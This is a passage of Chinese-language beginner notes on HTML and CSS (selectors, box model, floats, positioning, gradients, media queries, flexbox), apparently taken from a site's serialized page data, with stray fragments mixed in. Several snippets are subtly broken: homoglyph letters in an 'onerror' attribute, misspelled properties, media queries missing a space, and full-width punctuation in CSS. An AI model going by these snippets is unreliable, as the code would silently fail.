</tr>\n  </tfoot>\n</table>\n\n    \n\n\n  table {\n            border: 1px solid #aaaaab;\n            width: 100%;\n            background-color: #25242a;\n            max-width: 100%;\n            border-collapse: collapse;\n            border-spacing: 0;\n            font-size: 12px;\n            color: #aaaaab;\n            tr > td:nth-child(odd) {\n              width: 150px;\n            }\n            tr > td:nth-child(even) {\n              width: 450px;\n            }\n            td {\n              padding: 8px;\n              line-height: 1.42857;\n              vertical-align: top;\n              box-sizing: border-box;\n              color: #ddd;\n              border: 1px solid #aaaaab;\n            }\n          }\n\n\n\n# 容易混淆的几个css属性\n\n属性               含义\nanimation（动画）    用于设置动画属性，他是一个简写的属性，包含6个属性\ntransition（过渡）   用于设置元素的样式过度，和animation有着类似的效果，但细节上有很大的不同\ntransform（变形）    用于元素进行旋转、缩放、移动或倾斜，和设置样式的动画并没有什么关系，就相当于color一样用来设置元素的“外表”\ntranslate（移动）    translate只是transform的一个属性值，即移动。\n\nmysql> SELECT User, Host FROM mysql.user 转自中国存储网，原文链接：http://www.chinastor.com/yw/04293QK2018.html',normalizedContent:'# 一. 网站开发流程\n\n 1. 项目规划\n 2. 平台规划\n 3. 程序开发\n    * 前端web开发\n    * 后端开发\n 4. 网站测试\n\n\n# 二、开发工具\n\n编辑器、浏览器\n\n\n# 各种兼容的meta\n\n\n  \x3c!-- 兼容ie --\x3e\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    \x3c!-- 高速渲染页面 --\x3e\n    <meta name="renderer" content="webkit">\n\n    \x3c!-- seo:提高搜索度 --\x3e\n    <meta name="keywords" content="">\n\n    <meta name="description" content="">\n\n\n\n# . 适配iphonex\n\n> 我们需要将顶部和底部合理的摆放在安全区域内，ios11新增了两个css函数env、constant，用于设定安全区域与边界的距离。\n\n函数内部可以是四个常量：\n\n\nsafe-area-inset-left：安全区域距离左边边界距离\nsafe-area-inset-right：安全区域距离右边边界距离\nsafe-area-inset-top：安全区域距离顶部边界距离\nsafe-area-inset-bottom：安全区域距离底部边界距离\n\n\nwarning\n\n * 注意：我们必须指定viweport-fit后才能使用这两个函数：\n\n\n<meta name="viewport" content="width=device-width, viewport-fit=cover">\n复制代码\nconstant在ios < 11.2的版本中生效，env在ios >= 11.2的版本中生效，这意味着我们往往要同时设置他们，将页面限制在安全区域内：\nbody {\n  padding-bottom: constant(safe-area-inset-bottom);\n  padding-bottom: env(safe-area-inset-bottom);\n}\n\n当使用底部固定导航栏时，我们要为他们设置padding值：\n{\n  padding-bottom: constant(safe-area-inset-bottom);\n  padding-bottom: env(safe-area-inset-bottom);\n}\n\n具体细节\naotu.io/notes/2017/…\n4.关于横屏\njs识别\nwindow.addeventlistener("resize", ()=>{\n    if (window.orientation === 180 || window.orientation === 0) { \n      // 正常方向或屏幕旋转180度\n        console.log(\'竖屏\');\n    };\n    if (window.orientation === 90 || window.orientation === -90 ){ \n       // 屏幕顺时钟旋转90度或屏幕逆时针旋转90度\n        console.log(\'横屏\');\n    }  \n});\n复制代码\ncss识别\n@media screen and (orientation: portrait) {\n  /*竖屏...*/\n} \n@media screen and (orientation: landscape) {\n  /*横屏...*/\n}\n\n\n\n# 二、html\n\n\n# 1. 什么是html?\n\n> 中文：超文本标记语言，由浏览器解释执行。\n\n\n# 2. html框架\n\n\x3c!-- html版本号 ,告诉浏览器以某个(html5)版本解释执行该html文件--\x3e\n<!doctype html>\n<html>\n\x3c!--头部标签--\x3e\n\n<head>\n    \x3c!-- 当前页面的字符编码格式，防止中文乱码 --\x3e\n    <meta charset="utf-8" />\n    <title>标题部分</title>\n</head>\n\x3c!--会经常编辑的标签，页面的结构全部都写在body里面--\x3e\n\n<body>\n    写主体部分\n</body>\n\n</html>\n\n\n\n# 3. 注释\n\nctrl+/ 作用：使代码无效\n\n\n# 4. 语法\n\n<标签名>内容</标签名>\n\n\n# 5. 常用标签介绍\n\n 1. div\n    \n    \n    .box{}\n\n    <div>这是一个div标签</div>\n\n\n 2. 图片标签\n    \n    \n    .box{}\n\n    <img src="a.jpg" title="图片的标题" alt="图片找不到">\n\n\n- `src`=>引入图片的内容\n- `title`=>鼠标移入，图片设置的标题\n- `alt`=>图片加载失败，找不到时显示的内容\n\n\n 3. 超链接标签\n    \n    \n    .box{}\n\n    <a href="https://www.baidu.com" target="_self" title="点我跳转">点我</a>\n\n\n- href=>跳转页面的地址\n- target=>跳转的方式\n    - _blank: 在新的窗口跳转\n    - _self:(默认)在当前窗口打开\n- title=>鼠标移入提示的内容\n\n\n\n其实可以利用<img>图片标签的onerror事件对其处理的，要求其加载失败之后，马上加载一张默认图片，而不是显示为红叉叉。\n\n其代码如下：\n\n[html] view plain copy\n<img src="s.png" onerror="javascript:this.src=\'xx.png\';this.width=80;this.height=80;" />  \n意为，如果加载s.png这张图片失败了，就马上去加载xx.png这张图片，同时xx.png这张图片要求其以80x80的方式加载。\n当然，如果你要设置更多属性，完全可以写成这样：\n\n[html] view plain copy\n<img src="s.png" onerror="onerrorhandle(this)" />  \n声明这个s.png加载失败的javascript处理函数是onerrorhandle，然后把自己，也就是这个img节点传过去，\n然后在javascript中写一个这样的onerrorhandle函数：\n\n[javascript] view plain copy\nfunction onerrorhandle(obj){  \n    obj.src="xx.png";  \n    obj.width=80;  \n    obj.height=80;  \n    }  \nxx.png。\n但问题来了，如果xx.png 也不存在，则继续触发 onerror，导致循环，故会出现打开网页时提示 stack overflow at line: 0错误。\n特别说明：如果图片存在，但网络很不通畅，也可能触发 onerror。\n解决方法：\n第一种：去掉 onerror 代码；或者更改 onerror 代码为其它；或者确保 onerror 中的图片足够小，并且容易加载而存在。\n第二种：控制它不循环，代码如下：\n<script type="text/javascript">\n<!–\nfunction nofind(){\nvar img=event.srcelement;\nimg.src="images/xx.png";\nimg.οnerrοr=null; 控制不要一直跳动\n}\n//–>\n<\/script> \n\n<img src="images/logo.png" οnerrοr="nofind();" />\n\n\n注意\n\n 1. 属性与属性之间要有空格\n 2. 创建html主体的快捷方式 ！+tab\n 3. 标签的快捷方式 标签名+tab\n\n\n# 6. 标签的分类\n\n * 1. 块标签 div（无意义的块标签）、h1~h6、p、ul li、ol li\n\n特点：独占一行，能设置宽高 转换：display:block;\n\n * 2. 行内标签 a span(无意义) i\n\n特点：不会独占一行，不可以设置宽高 转换：display:inline;\n\n * 3. 行内块标签 img\n\n特点：不会独占一行，可以设置宽高 转换：display:inline-block;\n\nh1~h6 一级标题标签~六级标题标签 span 文本标签 p 段落标签 i 斜体标签 b 粗体 s 删除线 del ul li 无序列表标签（成对使用） ol li 有序列表标签（成对使用）\n\n\n# 7. 路径问题\n\n 1. 绝对路径\n\n> 从根目录或者盘符开始，依次往下找\n\n 2. 相对路径\n\n * (1)参考文件与目标文件在同一级\n\n<img src="a.jpg" alt="">\n\n\n * (2)参考文件与目标文件所在的文件夹在同一级\n\n<img src="img/a.jpg" alt="">\n\n\n\n * (3)参考文件所在的文件夹与目标文件在同一级，向上返回一级一个../\n\n<img src="../../a.jpg" alt="">\n\n\n\n# 三、css\n\n\n# 1. 什么是css?\n\n> 中文：层叠样式表，由浏览器解释执行。\n\n\n# 2. 语法\n\n\n选择器{\n    属性:属性值;\n    属性:属性值;\n    属性:属性值;\n}\n\n\n * 选择器：选中html页面中的元素。\n * 属性：宽、高、颜色\n * 属性值：100px、red\n * 标点符号必须为英文状态。\n\n\n# 3. css引入方式\n\n * 1. 外部引入\n\n\x3c!--在html文件的head标签中--\x3e\n<link rel="stylesheet" href="day.css">\n\n\n * 2. 嵌入式(在html页面中通过style标签写样式)\n\n\n<style>\n    div{\n        width:100px;\n        height: 100px;\n        background-color:red;\n    }\n</style>\n\n\n * 3. 行内样式\n\n给标签添加style属性\n\n<div style="width:100px;height: 100px;background-color:yellow; ">好好听课</div>\n\n\n * 4.@import\n\n@import "day.css";\n\n * 优先级\n   1. 行内样式优先级最高\n   2. 其他的样式表，优先级一样，按照导入的顺序来确定他们是否起作用。\n\n\n# 4. 选择器\n\n# 1. 基础选择器\n\n*（通用选择器）、标签选择器、类名选择器、id选择器、后代选择器、交叉选择器、群组选择器 浏览器默认样式<通用选择器<标签选择器<类名选择器<id选择器\n\n 1. 标签选择器\n\n\n    <div></div>\n    div{}\n\n\n 2. 类名选择器\n\n\n   <div class="box"></div>\n   .box{}\n\n\n\n\n\n 3. id选择器（id名是唯一的）\n\n\n   <div id="box1"></div>\n   #box1{}\n\n\n\n\n\n优先级\n    id选择器>类名选择器>标签选择器\n权重  100       10       \n\n\n 4. 通用选择器（优先级最低）\n\n *{\n   margin:0;\n   padding:0;\n    \n}\n\n\n 5. 后代选择器\n\n<div class="box">\n    <div class="small">\n        </dic>\n    </div>\n    .box .small{}\n\n\n 6. 交叉选择器\n\n  li.box {\n      background: yellowgreen;\n\n  }\n\n  .box.box1 {\n      background: pink;\n  }\n\n\n 7. 群组选择器\n\n .box,\n .box1 {\n     background: blue;\n }\n\n\n# 2 . 伪类选择器\n\n> 操作的是真实的dom元素和用户交互\n\n.box:nth-child(2) (父元素的所有子元素中，类名为box的并且为第二个的；否则失效)\n\n：first-child（第一个）\n\n：last-child（最后一个）\n\n：nth-last-child（）（倒数第几个）\n\n.box:nth-of-type(2)\n\n(类名为box的元素，视其他元素而不见，在类名为box的元素中找第二个元素添加样式)\n\n：first-of-type 这种类型的第一个\n\n：last-of-type 这种类型的最后一个\n\n：hover 鼠标移入\n\n：focus 获取焦点\n\n\n odd 和 even 是可用于匹配下标是奇数或偶数的子元素的关键词（第一个子元素的下标是 1）。\n\n在这里，我们为奇数和偶数 p 元素指定两种不同的背景色：\n\np:nth-child(odd)\n{\nbackground:#ff0000;\n}\np:nth-child(even)\n{\nbackground:#0000ff;\n}\n\n\n# 3. 伪元素选择器\n\n> 操作的是页面中非真实的dom元素；有标签 的叫真实的dom元素，没有标签的是非真实的dom元素\n\n * 文本标签中（例如p）\n\n：：first-letter 选中第一个字母 ：：first-line选中第一行文本\n\n * 在div中（可解决浮动的bug）\n\n：：before 插入到玄素内部，作为第一个元素出现 ：：after 插入到元素的内部，作为最后一个元素的出现\n\n.box::before,\n.box::after {\n    content: "";\n    display: block;\n}\n\n\n# 4. 属性选择器（css3新增选择器）\n\nhtml属性\n\n 1. [class] 为页面中有class 属性的元素添加样式\n 2. [class="box"]选中页面中有class属性的，并且属性值只能为box（属性值代表引号内部的）\n 3. [class*="b"]选中页面中有class属性的，并且包含字母b的元素\n 4. [class~="box"]选中页面中有class属性的，并且属性值中有空格，box代表其中一个单词，它本身也会被选中\n 5. [class|="box"]选中页面中有class属性的，并且属性值中有连字符，box代表连字符前面那个单词，它本身也会被选中。\n 6. [class^="b"]选中页面中有class属性的，并且属性值以b开头的元素\n 7. [class$="ox"] 选中页面中有class的，并且属性值以ox结尾的元素\n\n# 子代选择器\n\n.box>div 子代选择器，只选择子代 .box div 后代选择器，全部的孩子，包括子类及子类的子类\n\n\n# 计算器\n\n\ncalc\n\n\n\n# 5. 文字属性\n\n\n    /*字体的大小*/\n    font-size: 30px;\n    /*字体的颜色*/\n    color:red;\n    /*字体粗细*/\n    font-weight:bolder;\n    /*设置字体*/\n    font-family: "宋体";\n    /*水平居中*/\n    text-align: center;\n    /*垂直居中*/\n    line-height:300px;\n    /* 斜体 */\n    font-style: italic;\n    /* 字间距 */\n    letter-spacing:10px; \n    /*首行缩进 1em表示文字的大小 */\n    text-indent: 2em;\n    /*自动换行*/\n    word-break:break-all;\n    /*禁止用户选中文本*/\n    user-select：none；\n    \n    /*单行文本溢出*/\n    .box{\n        /*限制换行*/\n        white-space:nowrap;\n        /*超出影藏*/\n        overflow:hidden;\n        *将超出的文本内容显示为圆点\n        text-overflow:ellipsis;\n    }\n    /*文字分散\n    text-align: justify;\n   text-justify: distribute-all-lines; //兼容ie浏览器\n    margin: 0 auto;\n    text-align-last: justify;\n    /*\n    \n    /*多行文本溢出（谷歌）\n    .box{\n        /*定义为盒子显示*/\n        display:-webkit-box;\n        /*定义框内元素的排列方式为垂直排列*/\n        -webkit-box-orient:vertical;\n        /*限制一个块元素显示的文本行数*/\n        -webkit-line-clamp:2;\n        /*超出隐藏*/\n        overflow:hidden;\n        /*超出的文本内容变为圆点*/\n        text-overflow：ellipsis;  \n        \n        文字垂直一行显示\n        >放文字的盒子的宽<2em；\n        1em表示一个文字的大小，等于font-size\n        \n        *文字的渐变\n        把文本内容之外的背景给裁剪掉（谷歌）\n        div{\n    /*将背景设为渐变色（兼容性）\n       background:linear-gradient(to right,red,blue);\n       background:-webkit-linear-gradient(to right,red,blue);\n    /*规定背景的绘制区域\n       -webkit-background-clip:text;\n    /*将文字设置为透明色*/\n        color：transparent;\n         }\n    @font-face{\n    font-family: "名字随便起"；\n    src:url(\'../font/字体的名称.eot\');\n    src:url(\'../font/字体的名称.woff\')format("woff"),\n    url(\'../font/字体的名称.ttf\')format("truetype"),\n    uer(\'../font/字体的名称.svg\')format("svg"),\n}\n\n.box{\n      -webkit-user-select: none;\n  -moz-user-select: none;\n  -ms-user-select: none;\n  user-select: none;\n}\nbox里的文字将不被选中复制\n\nhtml中的代码加一个h1或者其他的，里面写你自己想要的特殊文字\n\n\n> 注意：写在background属性下面，正常；写在background上面clip不生效\n\n\n# 6. 颜色的表示方法\n\n\n\t/* 关键字 */\n\tbackground: red;\n\t/* 十六进制 0~f */\n\tbackground: #ff0000;\n\t/* rgb 0~255 */\n\tbackground: rgb(255,0,0);\n\t/* rgba 0~255  0~1*/\n    background: rgba(255,0,0,0.5);\n    /* opacity 0~1 */\n    background: rgb(255,0,0);\n    opacity:0.5;\n\n\nrgba和opacity的区别\n\n> rgba只作用在背景颜色，其他内容不会变透明。\n\nopacity作用在全部的地方，其他内容也会变透明。\n\n\n# 四、盒子模型\n\n文档流：页面中的元素默认的从左往右、从上往下排列。\n\n\n# 1. 组成：\n\n> 内容、padding(填充)、border(边框)、margin(间距)\n\n\n# 2. 内容\n\n宽高\n\n\n# 3.padding(内填充)\n\n> 盒子与内容之间的距离\n\n        /*上下左右*/\n        /*padding:20px;*/\n        /*上下  左右*/\n        /*padding:20px 30px;*/\n        /*上 左右  下*/\n        /*padding:20px 30px 40px;*/\n        /*上  右   下  左*/\n        /*padding:20px 30px 40px 50px;*/\n        分开设置 padding-top:20px;\n        padding-left: 20px;\n        padding-right: 20px;\n        padding-bottom:0;\n\n\n问题：使盒子变大\n\n * 解决：\n\n 1. 减少内容的宽高\n 2. box-sizing:border-box;//目的也是让内容的宽高减少\n\n\n# 4.border(边框)\n\n四个方向\n border:5px         double        #000;\n      边框的粗细    边框的样式    边框的颜色\n 分开设置\n border-top:5px solid #000;\n 边框样式：solid  dashed  dotted  double \n border-left:none;\n border-right-color: red;\n\n\n问题：盒子变大 解决：\n\n * 1. 减少内容的宽高\n\n * 2.box-sizing:border-box;\n   \n   盒子的宽=内容的宽+左右的padding+左右的border 盒子的高=内容的高+上下的padding+上下的border\n\n\n# 5.margin(外间距)\n\n> 盒子与盒子的间距\n\n        /*上下左右*/\n        /*margin:20px;*/\n        /*上下  左右*/\n        /*margin:20px 30px;*/\n        /*上 左右  下*/\n        /*margin:20px 30px 40px;*/\n        /*上  右   下  左*/\n        /*margin:20px 30px 40px 50px;*/\n        分开设置 margin-top:20px;\n        margin-left: 20px;\n        margin-right: 20px;\n        margin-bottom:0;\n\n\n * 问题1：给子元素添加margin-top, 好像作用在父元素身上。\n\n * 解决：\n   \n   * 1.给父元素添加padding,去代替子元素的margin。\n   * 2.给父元素添加 overflow:hidden;\n   * 3.破坏条件\n\n * 满足条件（五个缺一不可，都满足才会发生）\n   \n   * 1.父元素没有上边框。\n   * 2.父元素没有上填充。\n   * 3.该子元素是父元素的第一个子元素。\n   * 4.父元素没有浮动\n   * 5.子元素没有浮动\n\n * 问题2：上下盒子的上下margin会进行叠加。\n\n * 问题3：水平居中\n   \n   \n   .box{}\n\n\n    margin:0 auto;\n    ```\n\n* 问题4：去掉浏览器的默认样式\n\n``` css\n/* 通用选择器 */\n\n* {\n\n    /* 去掉浏览器的默认样式 */\n    margin: 0;\n    padding: 0;\n    /* 去掉列表的样式 */\n    list-style: none;\n}\n\n/* 去掉a链接的下划线 */\na {\n    text-decoration: none;\n}\n\n\n\n# 五、浮动\n\n\n# 1. 什么时候使用？\n\n元素需要横排的时候。\n\n\n# 2. 浮动分类\n\n * 左浮动=>float:left;\n * 右浮动=>float:right;\n\n\n# 3. 浮动什么时候停止?\n\n父元素的宽不足以容纳下浮动的子元素，放不下的子元素按照浮动的类型去排列。\n\n\n# 4. 卡顿\n\n> 子元素的高度不相同的时候\n\n * 左浮动：掉下来的子元素从左往右，以最右边的初始位置水平向左移动。\n * 右浮动：掉下来的子元素从左往右，以最左边的初始位置水平向右移动。\n\n\n# 5. 注意\n\n * 浮动的元素脱离文档流\n * 浮动的元素撑不开父元素的高度\n * 1. 直接给父元素设置高度\n * 2. 给父元素添加overflow：hidden；（自动给父元素添加高度）\n * 3. 添加伪元素清楚浮动\n\n\n.box::after{\n    content:"";\n    display:block;\n    clear:both;\n}\n\n\n * 4. 创建最后一个子元素（比如.box）, 清除浮动\n\n\n<div class="box"></div>\n.box{\n    clear:both;\n}\n\n\n-浮动的元素必须有一个不添加浮动的父元素包裹。\n\n\n# 补充\n\n1.icon图标的使用\n\n<1>. 在阿里巴巴矢量图标库中找到对于的icon图标；\n\n<2>点击添加购物车->加入到项目中（没有的话自己新建项目）->在我的项目中选择font class，\n\n点击生成在线的css地址->在html页面中通过link标签引入（记得加上 httpp：）->\n\n在页面中需要引入图标的位置通过i标签使用\n\n<i class="iconfont icon-daohanggouwuche"\n\n<3>. 在线地址要时刻更新\n\n\n# 六、定位\n\n\n# 1. 什么时候用？\n\n页面中的元素需要层叠的时候，或者页面中的元素固定不动的时候。\n\n\n# 2. 定位是什么？\n\n元素可以放在页面的任意位置，并且不会影响页面中的其他元素。\n\n\n# 3. 定位分类\n\n-没有脱离文档流，相对于自身去进行定位。\n\n  div {\n      position: relative;\n      top: 50px;\n  }\n\n\n 2. 绝对定位\n\n脱离文档流 -相对于离他最近的父元素定位，并且这个父元素身上有position定位属性；如果所有的父辈都没有定位属性，相对于body定位。\n\n父元素选择器{\n    position:absolute;\n}\n\n\n 3. 固定定位\n\n-脱离文档流 -相对于body（浏览器窗口）去进行定位，即使页面滚动，它还是固定在页面上不动的。\n\n. div {\n    position: fixed;\n    right: 0;\n    top: 200px;\n\n}\n\n\n 4. 调整层级z-index\n\n> 只有在定位属性的情况下，可以调整层级。层级默认是0，值越大，层级月噶。\n\n 5. 居中效果\n\n\n. css\n   div{\n       水平居中\n        方法1\n    position: absolute;\n    right: 0;\n    left: 0;\n    margin-left: auto;\n    margin-right: auto;\n        方法2\n    position: absolute;\n    left：50%；\n    margin-left：-**px（一般的高）\n    \n       \n        垂直居中\n          方法1\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    margin-top: auto;\n    margin-bottom: auto;\n          方法2\n    position: absolute;\n    top:50%\n    margin-top:-**px(一半高)\n    \n        水平垂直居中\n          方法1\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    right: 0;\n    left: 0;\n    margin: auto;\n         方法2\n    position: absolute;\n    left: 50%;\n    margin-left: -250px;\n    top: 50%;\n    margin-top: -60px;\n}\n\n\n 2. 鼠标移入\n\n.box:hover {\n    color: white;\n    鼠标移入类名为box的盒子，字体颜色变为白色\n}\n\n\n鼠标变小手\n\ncursor:pointer;\n\n 3. 变圆角\n\n\n border-radius:50%\n\n\n 4. 输入框\n\n <input type="text"="请输入想要的内容">\n\n\n * placeholder=> 输入框的默认提示内容\n * 去掉输入框的默认边框和选中边框样式\n\n\n .input{\n     border:none;\n     outline:none;\n }\n\n\n-改变placeholder默认提示内容的样式\n\n\n     .input::-webkit-input-placeholder{\n     color:red;\n }\n\n\n * 获取焦点\n\n input:focus {\n     outline: none;\n\n }\n\n\n\n# ·补充内容介绍\n\n 1. display\n\n * display:none; 隐藏\n * display:block; 显示\n\n 2. overflow\n\n * overflow:hidden; 超出隐藏\n * overflow：auto；超出内容出现滚动条，否则不会\n * overflow:scroll；始终出行滚动条\n\n 去掉滚动条 选择器：：-webkit-scrollbar {\n     widht: 0;\n     height: 0;\n     隐藏 display: none;\n     去掉\n }\n\n\n 3. 2d动画效果\n 4. （1）. 平移\n\n 水平方向平移，正值向右平移，负值向左 transform:translatex(-20px);\n 垂直方向平移，正值向下平移，复制向上平移 transform:translatey(-20px);\n 第一个值表示水平方向，第二个值表示垂直方向；一个值表示水平方向 transform:translate(-20px);\n\n\n(2). 旋转\n\n deg角度 transform:rotate(-360deg) 正值表示顺时针方向选装，负值表示逆时针旋转\n\n\n（3）. 缩放\n\ntransform: scalex(-1);\ntransform: scaley(2);\ntransform: scale(1, 2);\n/* 大于1的正值表示放大，0表示缩小为没有，负值表示反方向缩放;一个参数值表示水平和垂直等比例缩放 */\n``` （4）.斜切 ```css transform: skewx(60deg);\ntransform: skewy(60deg);\ntransform: skew(30deg, 30deg);\n\n\n过渡时间 transition: 1s;\n\n 5. 阴影内容\n\nbox-shadow: 0 0 15px 10px #666 inset;\n第一个参数：水平方向的偏移量，正右 负左 0左右 第二个参数：垂直方向的偏移量，正下 负上 0上下 第三个参数：阴影的模糊程度，值越大越模糊 第四个参数：阴影的大小，值越大阴影越大 第五个参数：阴影的颜色 第六个参数：内阴影（一般不用）\n\n\n 7. 标题前面加logo\n\n在head标签中\n\n<link rel="shortcut icon"> href="favicon.ico"\ntype="image/x-icon">\n\n\nhref=>引入图标的地址 图片大小设置为16*16\n\n 8. 多媒体标签（h5新标签）\n\n视频\n\n<video src="audion.mp4" controls="controls"></video>\n\n\n音频\n\n<audio src="背影.mp3" controls="controls"><audio>\n\n\n * border: 表格边框\n * cellspacing="0"; 去掉边框于边框之间的间距。\n * cellpadding="0"; 去掉边框内部的间隔。\n * colspan="2": 跨列合并表格单元格\n * rowspan="2": 跨行合并表格单元格\n\n\n# 七、渐变\n\n 1. 分类\n\n * 线性渐变（linear gradients）- 向下/向上/向左/向右/对角方向\n * 径向渐变（radial gradients）- 由它们的中心定义\n\n 2. 浏览器内核（兼容性）\n\n-webkit- 谷歌 -moz- 火狐 -ms- ie -o- 欧鹏\n\n 2. 线性渐变\n\n * 简单渐变，方向从上向下\n\n#box {\n    background: -webkit-linear-gradient(red, blue);\n    /* 谷歌 */\n    background: -o-linear-gradient(red, blue);\n    /* 欧鹏*/\n    background: -moz-linear-gradient(red, blue);\n    /* 火狐*/\n    background: linear-gradient(red, blue);\n    /* 标准的语法 */\n}\n\n\n * 简单方向渐变\n\n#box {\n    background: -webkit-linear-gradient(left top, red, blue);\n    /* 谷歌 */\n    background: -o-linear-gradient(to right, red, blue);\n    /* 欧鹏*/\n    background: -moz-linear-gradient(30deg, red, blue);\n    /* 火狐*/\n    background: linear-gradient(to right, red, blue);\n    /* 标准的语法 */\n}\n\n\n第一个参数：渐变开始的方向 关键字：left、 top 、right、 to bottom、 角度：30deg 第二个参数：渐变开始的颜色 关键字、十六进制、rgb、rgba\n\n * 不均匀的线性渐变：\n\nbackground:内核+linear-gradient(left, red 10%, yellow, green 20%);\nbackground:linear-gradient(left, red 10%, yellow, green 20%);\n\n\n> 可以使用百分比或者像素值\n\n * 重复性的线性渐变：\n\nbackground:内核+repeating-linear-gradient(45deg, red, yellow 30%);\nbackground:repeating-linear-gradient(45deg, red, yellow 30%);\n\n\n 3. 径向渐变\n\n * 简单径向渐变\n\nbackground: 内核+radial-gradient(red, yellow);\n\n * 不均匀的径向渐变：\n\nbackground: 内核+radial-gradient(red 10%, yellow 20%, pink);\n\n * 重复性的径向渐变：\n\nbackground: 内核+-repeating-radial-gradient(red, yellow, pink 50%);\n\n\n# 九、 语义化标签（html5）\n\n * 1. 为什么使用？\n\n> 可以更好地理解网页的框架。\n\n * 2.header(头部)nav(导航栏)aside（侧边栏）`section（一部分）·footer(底部)\n\n\n    header：\n\n    不用多说，就是定义头部，可以多个。\n    footer：\n\n    底部，不一定是文档最底部，可以多个。\n    nav：\n\n    导航栏标签，定义导航栏。\n    article：\n\n    独立内容区域，与session类似，用于文章等。\n    aside：\n\n    页面侧边栏所使用。\n    time:\n\n    时间标签，主要用于搜索引擎和其它一些内容引擎特殊的解析和展示。\n    ruby：\n\n    注释标签，跟rt和rp一起使用，可以看一下效果\n    <ruby>\n    张 <rt>zhang</rt><rp>不显示</rp>\n    </ruby>\n\n    details：\n\n    点击展开详情，可以试一下，可能在很多场景下可以使用\n    <details>\n    <summary>更多</summary>\n    <p>详细内容</p>\n    </details>\n\n    mark:\n\n    会给这个字段添加一个背景色，那个颜色还改不了。\n    progress：\n\n    进度条，当做简易进度条使用，不够美观。\n    <progress value="50" max="100"></progress>\n\n    section：\n\n    节的意思，主要是区分开内容，文档中的节或者是文章的节。\n    video：\n\n    视频，现在大部分不支持自动播放了，微信能处理，其他还没见过能自动播放。\n    audio：\n\n    音频，也就是音乐，也不支持自动播放。\n    datalist:\n\n    强烈推荐，在我看来就是模糊查询，除了样式之外，非常好用。\n    <input type="text" list="carsd">\n    <datalist id="carsd">\n    <option value="wf"></option>\n    <option value="wg"></option>\n    <option value="dre"></option>\n    <option value="sdhjfgh"></option>\n    <option value="dfgsdw"></option>\n    <option value="fdgwfdg"></option>\n    <option value="dfgtyr"></option>\n    <option value="dfgwdfg"></option>\n    </datalist>\n    embed：\n\n    插入多媒体内容，小小试了试，可以播放视频，但是那些属性都不生效。待研究。\n    canvas：\n\n    画布，很强大很强大，值得研究。\n    main：\n\n    主要内容。\n\n\n\n\n# 十，背景图片\n\n * 引入背景图片\n\nbackground-image:url(图片地址)；\n\n\n * 禁止重复\n\nbackground-repeate:no-repeat;\n\n\n * 背景图片的大小；\n\nbackground-size：20px 14px； 宽 高 background-size:cover;\n按照宽高中的较小者占满盒子，较大者按照比例缩放，盒子不会出现空白。图片无法完全显示。 background-size:contain;\n按照宽高中的较大者占满盒子，较小者按照比例缩放，盒子会出现空白，图片可以完全显示。\n\n\n * 位置\n\nbackground-position:center bottom;\n第一个参数：水平方向 50% left right center 第二个参数：垂直方向 30% top bottom center 分开设置 background-position-x:20%;\nbackground-position-y:center;\n\n\n总设置\n\nbackground:url(../img/bannerl.jpg) no-repeat center center /100% auto;\n\n\n * 前提是定义了background-image属性，然后用background-attachment来指明背景图的位置是固定于视口的，还是随着包含块移动的。可简单理解为定义背景图片随滚动轴的移动方式。\n\n * 取值：\n\n如果轮播图是全屏的话设置设置方法 使用最多19201080 21601440 安全可视区，一般设置为1200\n\n显示图片的容器是固定宽高，但上传的图片是不确定的，要引入背景图片\n\n * scroll: 默认值，背景图相对于元素固定，背景随页面滚动而移动，即背景和内容绑定。\n\n * fixed：背景图相对于视口固定，所以随页面滚动背景不动，相当于背景被设置在了body上。\n\n * local：背景图相对于元素内容固定，\n\n * inhert: 继承，没什么说的。\n\n * 该属性可以应用于任何元素。\n\n * nth选择器\n\n\n.box1:nth-child(){}\n\n\n\n# 十一、 响应式布局\n\n媒体查询\n\n@media screen and (min-width:1200px) {\n    .box8 {\n        background-color: red;\n    }\n}\n\n@media screen and (max-width:1200px) {\n    .box8 {\n        background-color: antiquewhite;\n    }\n}\n\n@media screen and (max-width:992px) {\n    .box8 {\n        background-color: aqua;\n    }\n}\n\n@media screen and(max-width:768px) {\n    .box8 {\n        background-color: black;\n    }\n}\n\n\n\n# 十二、移动端布局准备工作\n\n * 添加修改适口 ```html <meta name="viewport\n\ncontent="width=device-width, user-scalable=no, initial-scale=1.0; maximum-scale=1.0, minimum-scale=1.0">\n\n\nuser-scalable=no (禁止用户调整窗口大小)\ninitial-scale=1.0 （窗口的初始缩放比例为1）\n maximum-scale=1.0, （最大调整比例为1）\n  minimum-scale=1.0 （嘴小调整比例为1）\n\n2. 兼容不同的屏幕大小（响应式布局）\n\n``` css\nhtml {\n    font-size: 100px;\n    （以标准widht=750px）\n}\n\n先定位font-sieze的大小，建议为100 好算/ @media screen and(min-width:320px) {\n    html {\n        font-size: 42.6667px;\n    }\n}\n\n@media screen and(min-width:360px) {\n    html {\n        font-size: 48px;\n    }\n}\n\n@media screen and(min-width:375px) {\n    html {\n        font-size: 50px;\n    }\n}\n\n@media screen and(min-width:411px) {\n    html {\n        font-size: 54.8px;\n    }\n}\n\n@media screen and(min-width:414px) {\n    html {\n        font-size: 55.2px;\n    }\n}\n\n\n注意* 使用 min-widht 时，屏幕尺寸从小往大排，使用max-widht时，屏幕尺寸从大到小排；\n\n 3. rem介绍\n\n> rem 是相对于根元素html\n\nrem其实就是一个单位，1rem=1*html字体大小\n\n     html {\n         font-size: 100px;\n     }\n\n     div {\n         widht: 2rem;\n         height: 2rem: 那么这里的实际值，其实就是2*100px=200px*/\n     }\n\n\n\n# 十三弹性布局\n\n\n# 1. 概念\n\n * 容器 ：父元素\n\n * 项目： 子元素\n\n * 两根轴： 主轴=>默认水平方向。\n   \n         交叉轴=>默认垂直方向\n         display:flex;(转换为弹性布局)\n   \n\n\n# 2. 容器（写在父元素身上）的属性\n\n1.flex-direction : 确定主轴的方向\n\n * row（默认值）：主轴为水平方向，从左往右\n * row-reverse: 主轴在水平方向，从右往左\n * column: 主轴在垂直方向，从上往下。\n * column-reverse: 主轴在垂直方向，从下到上。\n\n2 .flex-wrap: 子元素的换行\n\n * wrap：换行，从上到下\n\n * nowrap：不换行（默认值）\n\n * wrap-reverse：换行，从下到上\n\n 3. justify-content：子元素在主轴方向的对齐方式\n\n * flex-start: 主轴的起点\n * center 主轴的中点\n * flex-end 主轴的终点\n * space-between 两端对齐，子元素之间的间隔都相等\n * space-around 每个子元素左右两边的距离都相等\n\n 4. align-items 子元素在交叉轴方向的对齐方式（适用于一根轴线和多根轴线）\n\n * flex-start 